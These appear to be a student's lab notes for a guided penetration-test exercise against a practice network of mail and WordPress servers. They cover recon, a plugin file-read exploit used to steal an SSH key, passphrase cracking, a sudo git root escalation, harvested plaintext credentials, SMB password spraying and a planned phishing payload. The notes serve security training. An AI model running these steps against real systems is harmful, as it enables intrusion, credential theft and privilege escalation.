Topics: Assembling the Pieces
# Questions 1
Start the VM group to follow along the guided penetration test throughout the Module. Once you have access to the domain controller, retrieve the NTLM hash of the domain administrator account BEYOND\Administrator and enter it as answer to this exercise.

172.16.155.240 VM #1 OS 
172.16.155.243 VM #4 OS
172.16.155.241 VM #2 OS
192.168.199.242 VM #3 - MAILSRV1 
192.168.199.244 VM #5 - WEBSRV1
192.168.199.250 VM #6 - WINPREP OS (offsec:lab)

# MAILSRV1
sudo nmap -sC -sV -T4 -vvv 192.168.199.242 
...
25/tcp  open  smtp          syn-ack ttl 125 hMailServer smtpd
80/tcp  open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
110/tcp open  pop3          syn-ack ttl 125 hMailServer pop3d
135/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
143/tcp open  imap          syn-ack ttl 125 hMailServer imapd
445/tcp open  microsoft-ds? syn-ack ttl 125
587/tcp open  smtp          syn-ack ttl 125 hMailServer smtpd
...

# WEBSRV1
sudo nmap -sC -sV -T4 -vvv 192.168.199.244
...
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
...

# hMailServer is discovered, lets check on the directory and subdomain buster

# MAILSRV1
gobuster dir -u http://192.168.199.242 -w=/home/kali/Tools/dict/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt 
# No results come back

# WEBSRV1
gobuster dir -u http://192.168.199.244 -w /home/kali/Tools/dict/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
...
/admin                (Status: 302) [Size: 0] [--> http://192.168.199.244/wp-admin/]
...

# Checked both server  Apache 2.4.52 version which we have no any actionable exploit. As well as OpenSSH 8.9p1 Ubuntu3. We'll skip it now 


# Checked the webpage it is Wordpress. 
whatweb http://192.168.199.244
...
http://192.168.199.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.199.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
...

# We can use WPscan to lookthrough any vulnerablity exist on the WEBSERV
wpscan --url http://192.168.199.244 -e vp --api-token

wpscan --url http://192.168.199.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
...
akismet
 | Latest Version: 5.3.2
 | The version could not be determined.
contact-form-7
The version is out of date, the latest version is 5.9.5
| Version: 5.6.3 (90% confidence)
 | [!] Title: Contact Form 7 < 5.8.4 - Authenticated (Editor+) Arbitrary File Upload
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/70e21d9a-b1e6-4083-bcd3-7c1c13fd5382
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6449
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5d7fb020-6acb-445e-a46b-bdb5aaf8f2b6
 |
 | [!] Title: Contact Form 7 < 5.9.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.9.2
 |     References:
 |      - https://wpscan.com/vulnerability/1c070a2c-2ab0-43bf-b10b-6575709918bc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2242
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d5bf4972-424a-4470-a0bc-7dcc95378e0e
duplicator
The version is out of date, the latest version is 1.5.9
 Version: 1.3.26 (80% confidence)
elementor
The version is out of date, the latest version is 3.21.7
Version: 3.7.7 (100% confidence)
Title: Elementor Website Builder < 3.12.2 - Admin+ SQLi
 |     Fixed in: 3.12.2
 |     References:
 |      - https://wpscan.com/vulnerability/a875836d-77f4-4306-b275-2b60efff1493
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0329
wordpress-seo
The version is out of date, the latest version is 22.7
 | Version: 19.7.1 (100% confidence)
...

# Found Contact Form vulnerability 
https://github.com/0dteam/CVE-2024-22024
# Attacker URL I Use webhook.site to capture
https://webhook.site/
python cve_2024_22024.py -u http://192.168.199.244 -c https://webhook.site/c4329d48-14b7-4b05-a3be-f4cb078b3913
...
Response from http://192.168.199.244: 404
...
# Lol...  404 

# Let check another vulnerable plugin
searchsploit duplicator
...
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read          | php/webapps/50420.py
...
searchsploit -m 50420 
python 50420.py http://192.168.199.244 /etc/passwd
...
root:x:0:0:root:/root:/bin/bash
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
...

# We can find its id_rsa file from those user
python 50420.py http://192.168.199.244 /home/daniela/.ssh/id_rsa
[id_rsa_daniela_webserv1]

# Lets SSH into the machine
ssh -i id_rsa_daniela daniela@192.168.199.244
Enter passphrase for key 'id_rsa_daniela': 

# Required for passphrase, we can try brute force
ssh2john id_rsa_daniela > ssh.hash 
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa_daniela) 
...

# SSH into it again
ssh -i id_rsa_daniela daniela@192.168.199.244
Enter passphrase for key 'id_rsa_daniela': tequieromucho 

# User sudo permission status
daniela@websrv1:/home$ sudo -l
Matching Defaults entries for daniela on websrv1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git

# No password required to /usr/bin/git, we can use LOLBIN to find how to perform privilege escalation
https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/
sudo git help config
# Inject "!/bin/sh" 
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
...
changed  checker.py  mysql.sh  snap
...
cat mysql.sh
...
mysql --user="root" --password="DanielKeyboard3311" --database="wordpress" --execute="update wp_options set option_value='http://$1' where option_name = 'siteurl';"
mysql --user="root" --password="DanielKeyboard3311" --database="wordpress" --execute="update wp_options set option_value='http://$1/main' where option_name = 'home';"
...

# We further investigate into wordpress file in /srv/www/wordpress, where we can use Git to check more information
git status
git log
...
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
...

git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
...
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
    Removed staging script and internal network access
diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
...


# We can use some tools like Linpeas and run with root user
wget http://192.168.45.232/linpeas_linux_amd_64
./linpeas_linux_amd_64
...
/srv/www/wordpress/wp-config.php                                   
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
...

# Here we obtain 192.168.50.245 pass, and put it in the cred.txt. 
# Lets try crackmapexec smb to all the network
code username.txt
code password.txt
sudo crackmapexec smb 192.168.199.0-254 -u username.txt -p password.txt  --continue-on-success
...
SMB         192.168.199.242 445    MAILSRV1         [+] beyond.com\John:dqsTwTpZPn#nL 
...

smbclient -L //192.168.199.242 -U john -W beyond.com -password=dqsTwTpZPn#nL
...
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
...

# Only default shares, nothing to dig more, lets try rdp and SSH. where both also showing failed.

# We can try with the phishing email payload and hope that user will press for it.
